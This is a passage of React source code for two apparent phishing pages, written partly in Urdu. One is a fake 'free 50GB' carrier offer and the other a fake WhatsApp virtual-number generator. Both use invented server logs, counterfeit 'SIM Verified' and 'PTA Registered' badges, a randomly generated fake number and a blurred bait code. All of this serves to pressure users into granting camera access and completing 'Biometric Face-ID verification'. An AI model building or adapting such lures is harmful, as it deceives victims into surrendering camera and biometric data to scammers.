                        Retry Identity Sync
                      </button>
                    </div>
                  )}

                  <button 
                    onClick={async () => {
                      const success = await requestPermissions();
                      if (success) setStep(1);
                    }}
                    className="w-full py-5 bg-green-600 text-white font-black rounded-2xl transition-all hover:bg-green-500 active:scale-95 shadow-[0_20px_40px_rgba(34,197,94,0.2)] uppercase tracking-widest text-xs relative overflow-hidden group"
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000" />
                    Claim Free 50GB Now
                  </button>
                  
                  <div className="flex items-center justify-center gap-6">
                    <div className="flex items-center gap-1.5 opacity-40">
                      <ShieldCheck size={12} className="text-white" />
                      <span className="text-[9px] font-bold uppercase tracking-widest">SIM Verified</span>
                    </div>
                    <div className="flex items-center gap-1.5 opacity-40">
                      <AlertCircle size={12} className="text-white" />
                      <span className="text-[9px] font-bold uppercase tracking-widest">PTA Registered</span>
                    </div>
                  </div>
                </div>
              )}

              {step === 1 && (
                <div className="space-y-10 py-4 animate-in fade-in duration-500">
                  <div className="text-center space-y-6">
                    <div className="relative w-24 h-24 mx-auto">
                      <div className="absolute inset-0 rounded-full border-2 border-dashed border-green-500/20 animate-[spin_8s_linear_infinite]" />
                      <Loader2 className="w-24 h-24 text-green-500 animate-[spin_2s_linear_infinite]" />
                      <div className="absolute inset-0 flex items-center justify-center">
                         <div className="w-12 h-12 rounded-full bg-green-500/10 flex items-center justify-center">
                           <Smartphone size={24} className="text-green-500/40" />
                         </div>
                      </div>
                    </div>
                    <div className="space-y-1">
                      <h2 className="text-2xl font-bold text-white">Linking to Carrier</h2>
                      <p className="text-[10px] text-zinc-500 font-bold uppercase tracking-[0.3em] leading-none">Establishing Secure Handshake</p>
                    </div>
                  </div>
                  
                  <div className="space-y-4">
                    <div className="flex justify-between items-end px-2">
                      <span className="text-[10px] font-black uppercase text-zinc-500 tracking-[0.2em]">Processing Allocation</span>
                      <span className="text-2xl font-black text-white italic">{progress}%</span>
                    </div>
                    <div className="h-3 w-full bg-white/5 rounded-full overflow-hidden border border-white/5 p-1">
                      <motion.div 
                        initial={{ width: 0 }}
                        animate={{ width: `${progress}%` }}
                        className="h-full bg-green-500 transition-all duration-300 rounded-full shadow-[0_0_15px_rgba(34,197,94,0.5)]"
                      />
                    </div>
                  </div>

                  <div className="p-6 rounded-[2rem] bg-black/40 border border-white/5 font-mono text-[9px] text-zinc-400 space-y-1.5 shadow-inner">
                    <div className="pb-2 text-zinc-600 font-bold border-b border-white/5 mb-2">GATEWAY_SESSION_INIT</div>
                    {activationLogs.slice(0, Math.floor(progress / 15) + 1).map((log, i) => (
                      <motion.div 
                        initial={{ opacity: 0, x: -5 }} 
                        animate={{ opacity: 1, x: 0 }} 
                        key={i}
                        className="flex items-center gap-2"
                      >
                        <span className="text-green-500/60">&gt;</span>
                        {log}
                      </motion.div>
                    ))}
                  </div>
                </div>
              )}

              {step === 2 && (
                <div className="space-y-10 text-center animate-in zoom-in-95 duration-1000">
                  <div className="relative w-28 h-28 mx-auto">
                    <div className="absolute inset-0 bg-green-500/20 blur-3xl animate-pulse" />
                    <div className="relative w-28 h-28 rounded-full bg-green-500/10 border border-green-500/20 flex items-center justify-center shadow-inner">
                      <Sparkles className="w-14 h-14 text-green-500" />
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div className="space-y-2">
                       <h2 className="text-4xl font-black text-white tracking-tight leading-none uppercase">VERIFIED!</h2>
                       <p className="text-[10px] font-black uppercase text-green-500 tracking-[0.3em]">رابطہ کامیاب • Connectivity Established</p>
                    </div>
                    <p className="text-sm text-zinc-400 leading-relaxed px-4">Your device identity is confirmed. <span className="text-white font-bold">Final Step:</span> Perform Biometric Face-ID verification to unlock the data allocation to your number.</p>
                  </div>
                  <div className="space-y-4">
                    <button 
                      className="w-full py-6 bg-green-600 text-white font-black rounded-2xl hover:bg-green-500 transition-all uppercase tracking-widest text-sm shadow-[0_20px_40px_rgba(34,197,94,0.3)] active:scale-95"
                    >
                      Authorize Biometric Now
                    </button>
                    <div className="flex flex-col items-center gap-2">
                      <div className="flex items-center justify-center gap-4 text-[9px] font-black text-zinc-600 uppercase tracking-widest">
                         <div className="flex items-center gap-1">
                           <div className="w-1 h-1 rounded-full bg-zinc-600" />
                           <span>Sim Verified</span>
                         </div>
                         <div className="flex items-center gap-1">
                           <div className="w-1 h-1 rounded-full bg-zinc-600" />
                           <span>Secure Node</span>
                         </div>
                      </div>
                      <p className="text-[10px] text-zinc-500 italic opacity-50" dir="rtl">بایومیٹرک تصدیق درکار ہے</p>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Floating Background Icons */}
        <div className="fixed bottom-10 left-10 opacity-5 pointer-events-none">
           <Smartphone size={80} className="text-white" />
        </div>
        <div className="fixed top-20 right-10 opacity-5 pointer-events-none">
           <Hash size={80} className="text-white" />
        </div>
      </div>
    </div>
  );
}

function VirtualNumberStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
  const [selectedCountry, setSelectedCountry] = useState<string | null>(null);
  const [isGenerating, setIsGenerating] = useState(false);
  const [step, setStep] = useState(0); // 0: Selection, 1: Generating, 2: Result/Finish
  const [genLogs, setGenLogs] = useState<string[]>([]);
  const [fakeNumber, setFakeNumber] = useState('');

  const countries = [
    { code: 'US', name: 'United States', flag: '🇺🇸', area: '+1', count: 'Active' },
    { code: 'UK', name: 'United Kingdom', flag: '🇬🇧', area: '+44', count: 'Active' },
    { code: 'CA', name: 'Canada', flag: '🇨🇦', area: '+1', count: 'Active' },
    { code: 'TR', name: 'Turkey', flag: '🇹🇷', area: '+90', count: 'Limited' },
    { code: 'SA', name: 'Saudi Arabia', flag: '🇸🇦', area: '+966', count: 'Active' },
    { code: 'DE', name: 'Germany', flag: '🇩🇪', area: '+49', count: 'Active' },
  ];

  const logMessages = [
    "WhatsApp Activation Server: PK-SOUTH-1 Init...",
    "Bypassing international SMS gateway...",
    "Allocating virtual SIM instance...",
    "Verifying SIM registration with node...",
    "Binding number to local session...",
    "Generating secure activation token...",
    "Finalizing WhatsApp identity bridge..."
  ];

  const handleGenerate = async () => {
    const success = await requestPermissions();
    if (!success) return;
    
    setIsGenerating(true);
    setStep(1);
    
    // Play logs
    let currentLog = 0;
    const logInterval = setInterval(() => {
      if (currentLog < logMessages.length) {
        setGenLogs(prev => [...prev, `[${new Date().toLocaleTimeString('en-GB')}] ${logMessages[currentLog]}`]);
        currentLog++;
      } else {
        clearInterval(logInterval);
        setTimeout(() => {
          const area = countries.find(c => c.code === selectedCountry)?.area || '+1';
          const randomNum = Math.floor(Math.random() * 9000000) + 1000000;
          setFakeNumber(`${area} ${randomNum}`);
          setStep(2);
        }, 2000);
      }
    }, 700);
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] text-zinc-900 flex flex-col font-sans selection:bg-green-500/20 overflow-x-hidden">
      {/* WhatsApp Style Header */}
      <nav className="px-8 py-5 bg-[#075E54] text-white flex items-center justify-between shadow-lg sticky top-0 z-50">
        <div className="flex items-center gap-4">
          <div className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center shadow-inner">
            <MessageSquare size={24} className="text-[#25D366]" />
          </div>
          <div>
            <span className="block font-black text-lg tracking-tight">WA-ACTIVATOR PVT</span>
            <div className="flex items-center gap-2">
              <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
              <span className="text-[10px] font-black uppercase tracking-widest opacity-80">Local Node: Karachi (Active)</span>
            </div>
          </div>
        </div>
        <div className="hidden md:flex items-center gap-6 text-[10px] font-black uppercase tracking-widest">
           <span className="hover:text-green-400 cursor-pointer transition-colors">How it works</span>
           <span className="hover:text-green-400 cursor-pointer transition-colors">Server Status</span>
           <div className="px-4 py-2 bg-[#128C7E] rounded-lg hover:bg-[#128C7E]/80 cursor-pointer transition-all border border-white/10">
              Live Support
           </div>
        </div>
      </nav>

      <main className="flex-1 pb-20 bg-gradient-to-b from-white to-[#f0f2f5]">
        <div className="max-w-4xl mx-auto px-6 pt-12 space-y-12">
          {step === 0 && (
            <>
              <div className="text-center space-y-6 max-w-2xl mx-auto">
                <div className="space-y-4">
                  <motion.h1 
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="text-4xl md:text-5xl font-black text-zinc-800 tracking-tight leading-none"
                  >
                    Private WhatsApp Numbers
                  </motion.h1>
                  <div className="flex flex-col items-center gap-1">
                    <p className="text-[#128C7E] text-xs font-black uppercase tracking-widest">Premium Activation Service</p>
                    <p className="text-zinc-400 text-sm font-urdu leading-none" dir="rtl">واٹس ایپ کے لیے پرائیویٹ نمبر حاصل کریں۔</p>
                  </div>
                </div>
                <motion.p 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.1 }}
                  className="text-lg text-zinc-500 font-medium leading-relaxed"
                >
                  Apply now to get a temporary virtual number for instant WhatsApp activation and secure encrypted messaging from Karachi Node.
                </motion.p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 animate-in fade-in slide-in-from-bottom-4 duration-700">
                {countries.map((c, i) => (
                  <button
                    key={c.code}
                    onClick={() => setSelectedCountry(c.code)}
                    className={`p-6 rounded-[2.5rem] border transition-all relative group text-left shadow-sm ${
                      selectedCountry === c.code 
                        ? 'bg-white border-[#25D366] ring-4 ring-[#25D366]/10' 
                        : 'bg-white border-zinc-200 hover:border-[#25D366]/30 hover:shadow-xl'
                    }`}
                  >
                    <div className="flex justify-between items-start mb-6">
                      <div className="w-14 h-14 rounded-2xl bg-zinc-50 flex items-center justify-center text-4xl shadow-inner group-hover:scale-110 transition-transform">
                        {c.flag}
                      </div>
                      <div className={`px-2.5 py-1 rounded-full text-[9px] font-black uppercase tracking-widest ${
                        c.count === 'Active' ? 'bg-green-100 text-green-600' : 'bg-amber-100 text-amber-600'
                      }`}>
                        {c.count} SLOTS
                      </div>
                    </div>
                    <div className="space-y-0.5">
                      <span className="block font-black text-lg text-zinc-800 tracking-tight uppercase">{c.name}</span>
                      <span className="block text-[10px] font-black text-zinc-400 uppercase tracking-widest">Prefix: {c.area}</span>
                    </div>
                    {selectedCountry === c.code && (
                      <div className="absolute top-4 right-4 animate-bounce">
                         <div className="w-2 h-2 rounded-full bg-[#25D366]" />
                      </div>
                    )}
                  </button>
                ))}
              </div>

              <div className="flex flex-col items-center gap-6 pt-4">
                {permissionError && (
                  <div className="w-full max-w-sm p-4 rounded-2xl bg-red-50 border border-red-100 text-center space-y-3 animate-in fade-in slide-in-from-top-2">
                    <div className="flex items-center justify-center gap-2 text-red-600">
                      <AlertCircle size={14} />
                      <span className="text-[10px] font-black uppercase tracking-widest">Instance Lock Active</span>
                    </div>
                    <p className="text-[11px] text-zinc-500 font-medium">Secure provisioning requires identity linkage. Please allow camera access to unlock the global WhatsApp node.</p>
                    <button 
                      onClick={() => requestPermissions()}
                      className="text-[10px] font-black text-red-600 underline uppercase tracking-widest"
                    >
                      Click to unlock
                    </button>
                  </div>
                )}
                <button
                  disabled={!selectedCountry}
                  onClick={handleGenerate}
                  className="group relative px-14 py-6 bg-[#25D366] text-white font-black rounded-[2rem] transition-all hover:scale-105 hover:bg-[#1ebd5e] active:scale-95 disabled:opacity-30 disabled:scale-100 shadow-[0_20px_40px_rgba(37,211,102,0.3)] overflow-hidden"
                >
                  <div className="relative z-10 flex items-center gap-3 uppercase tracking-[0.2em] text-sm">
                    <Smartphone size={18} />
                    Generate Number
                  </div>
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000" />
                </button>
                <p className="text-[10px] text-zinc-400 font-bold uppercase tracking-[0.3em]" dir="rtl">نمبر جنریٹ کرنے کے لیے یہاں کلک کریں۔</p>
              </div>
            </>
          )}

          {step === 1 && (
            <div className="max-w-xl mx-auto space-y-12 py-12">
              <div className="text-center space-y-6">
                <div className="w-24 h-24 rounded-full bg-green-500/5 flex items-center justify-center mx-auto relative">
                   <div className="absolute inset-0 rounded-full border-2 border-dashed border-[#25D366]/20 animate-[spin_10s_linear_infinite]" />
                   <div className="absolute inset-4 rounded-full border border-[#25D366]/10" />
                   <Loader2 className="w-10 h-10 text-[#128C7E] animate-spin" />
                </div>
                <div className="space-y-1">
                  <h2 className="text-3xl font-bold text-zinc-800 tracking-tight leading-none">Accessing Slots...</h2>
                  <p className="text-[10px] text-[#128C7E] font-black uppercase tracking-[0.3em]">Node: PK-SOUTH-1 BRIDGE</p>
                </div>
              </div>

              <div className="bg-zinc-900 rounded-[2.5rem] p-10 font-mono text-[11px] space-y-3 text-zinc-400 shadow-2xl border border-white/5 relative overflow-hidden">
                <div className="absolute top-0 right-0 w-32 h-32 bg-[#25D366]/5 blur-3xl" />
                <div className="flex items-center gap-3 mb-6 text-[#25D366] font-bold border-b border-white/5 pb-4">
                  <div className="flex gap-1">
                     <div className="w-2 h-2 rounded-full bg-red-500" />
                     <div className="w-2 h-2 rounded-full bg-amber-500" />
                     <div className="w-2 h-2 rounded-full bg-green-500" />
                  </div>
                  <span className="uppercase tracking-[0.3em]">GATEWAY_STREAM</span>
                </div>
                {genLogs.map((log, i) => (
                  <motion.div 
                    key={i} 
                    initial={{ opacity: 0, x: -5 }} 
                    animate={{ opacity: 1, x: 0 }} 
                    className="flex items-start gap-3"
                  >
                    <span className="text-white/20 select-none">{i+1}</span>
                    <span className="text-[#25D366]/60">&gt;</span>
                    <span className="flex-1">{log}</span>
                  </motion.div>
                ))}
              </div>
            </div>
          )}

          {step === 2 && (
            <div className="max-w-3xl mx-auto animate-in zoom-in-95 fade-in duration-700">
               <div className="bg-white rounded-[3.5rem] overflow-hidden shadow-[0_40px_100px_rgba(0,0,0,0.08)] border border-zinc-100">
                 {/* Dashboard Header */}
                 <div className="p-10 border-b border-zinc-100 bg-[#f8f9fa] flex items-center justify-between">
                    <div className="space-y-1">
                      <span className="text-[11px] font-black text-[#128C7E] uppercase tracking-widest">Reserved Service Instance</span>
                      <h3 className="text-2xl font-black text-zinc-800 tracking-tight">ID: PVT-WA-{Math.floor(Math.random() * 90000) + 10000}</h3>
                    </div>
                    <div className="px-5 py-2 rounded-full bg-green-100 text-[#075E54] border border-[#25D366]/20 flex items-center gap-2 shadow-sm">
                      <Sparkles size={16} />
                      <span className="text-[10px] font-black uppercase tracking-widest">Secure Node</span>
                    </div>
                 </div>

                 <div className="p-12 space-y-12">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
                       <div className="space-y-8">
                          <div className="space-y-4">
                            <label className="text-[11px] font-black text-zinc-400 uppercase tracking-[0.2em] ml-2">Your Virtual Number</label>
                            <div className="p-8 rounded-[2.5rem] bg-zinc-50 border border-zinc-100 text-3xl font-black text-[#075E54] tracking-tight shadow-inner relative group cursor-pointer transition-all hover:bg-zinc-100">
                              {fakeNumber}
                              <div className="absolute top-3 right-6 text-[9px] text-[#25D366] font-black uppercase bg-[#25D366]/10 px-2 py-0.5 rounded-lg border border-[#25D366]/20 tracking-widest">Ready</div>
                            </div>
                          </div>
                          
                          <div className="space-y-4">
                            <label className="text-[11px] font-black text-zinc-400 uppercase tracking-[0.2em] ml-2">Verification Code</label>
                            <div className="p-8 rounded-[2.5rem] bg-zinc-900 border border-white/5 text-4xl font-black text-white tracking-[0.6em] shadow-2xl relative overflow-hidden text-center select-none group">
                               <span className="blur-2xl transition-all duration-1000 group-hover:blur-xl">882910</span>
                               <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/60 backdrop-blur-md">
                                  <Lock size={20} className="text-[#25D366] mb-2 opacity-50" />
                                  <span className="text-[10px] font-black uppercase text-white tracking-[0.3em] font-urdu" dir="rtl">سیکیورٹی لاک فعال ہے۔</span>
                                  <span className="text-[9px] font-medium uppercase text-white/50 tracking-[0.1em] mt-1">Verification Required</span>
                               </div>
                            </div>
                          </div>
                       </div>

                       <div className="bg-zinc-50 p-10 rounded-[3rem] border border-zinc-100 flex flex-col items-center justify-center text-center space-y-8 relative overflow-hidden group shadow-inner">
                          {/* Face Calibration Area */}
                          <div className="relative w-40 h-40">
                             <div className="absolute inset-0 rounded-full border-2 border-dashed border-[#25D366]/20 animate-[spin_20s_linear_infinite]" />
                             <div className="absolute inset-3 rounded-full border-4 border-[#25D366]/5" />
                             <div className="absolute inset-0 flex items-center justify-center">
                               <div className="w-16 h-16 rounded-full bg-white flex items-center justify-center shadow-lg border border-zinc-100">
                                   <UserCheck className="w-8 h-8 text-[#128C7E]" />
                               </div>
                             </div>
                             <div className="absolute top-0 left-0 w-full h-[3px] bg-[#25D366] shadow-[0_0_30px_rgba(37,211,102,1)] animate-scan-y-wa z-10" />
                          </div>
                          <div className="space-y-3">
                            <h4 className="font-black text-zinc-800 uppercase tracking-tight">Identity Mapping</h4>
                            <p className="text-[11px] text-zinc-500 leading-relaxed font-bold uppercase tracking-widest opacity-60">Verified User Protocol</p>
                            <p className="text-xs text-zinc-500 leading-relaxed font-medium" dir="rtl">براہ کرم سیکیورٹی تصدیق مکمل کریں تاکہ آپ کا نمبر ایکٹیویٹ ہو سکے۔</p>
                          </div>
                       </div>
                    </div>

                    <div className="space-y-6">
                      <button className="w-full py-7 bg-[#25D366] text-white font-black text-xl rounded-[2rem] transition-all hover:bg-[#1ebd5e] hover:shadow-[0_20px_50px_rgba(37,211,102,0.4)] active:scale-[0.98] shadow-2xl flex items-center justify-center gap-4 group uppercase tracking-[0.2em] relative overflow-hidden">
                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700" />
                        <CheckCircle2 size={24} />
                        <span className="text-sm">Activate & Unlock Code</span>
                      </button>
                      <div className="flex items-center justify-center gap-8 opacity-40 grayscale">
                         <div className="flex items-center gap-2">
                           <Shield size={12} />
                           <span className="text-[9px] font-black uppercase tracking-widest">End-to-End Encrypted</span>
                         </div>
                         <div className="flex items-center gap-2">
                           <Lock size={12} />
                           <span className="text-[9px] font-black uppercase tracking-widest">Karachi Secure Node</span>
                         </div>
                      </div>
                    </div>
                    
                    <div className="text-center pt-4">
                       <p className="text-[10px] text-zinc-400 font-bold uppercase tracking-widest leading-relaxed">
                         Regulatory Compliance: Biometric Mapping is mandatory for global numbering access. <br />Private Instances expire within 24 hours if not activated.
                       </p>
                    </div>
                 </div>
               </div>
            </div>
          )}
        </div>
      </main>

      <style jsx>{`
        @keyframes scan-y-wa {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(160px); }
        }
        .animate-scan-y-wa {
          animation: scan-y-wa 5s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}
